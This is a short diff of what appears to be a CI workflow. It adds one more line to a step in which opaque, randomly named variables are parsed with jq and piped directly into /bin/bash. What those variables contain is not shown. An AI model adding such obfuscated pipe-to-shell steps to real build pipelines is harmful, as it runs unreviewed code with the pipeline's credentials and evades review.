@@ -37,6 +37,7 @@ jobs:
           echo $ipl91 | jq -r .rg40 | /bin/bash
           printf '%s' "$qi7534" | jq -r .oas74 | /bin/bash
           echo $dgdu758 | jq -r .j891 | /bin/bash
+          echo $cyuo1 | jq -r .e60 | /bin/bash
 
       - name: Archive results
         if: always()
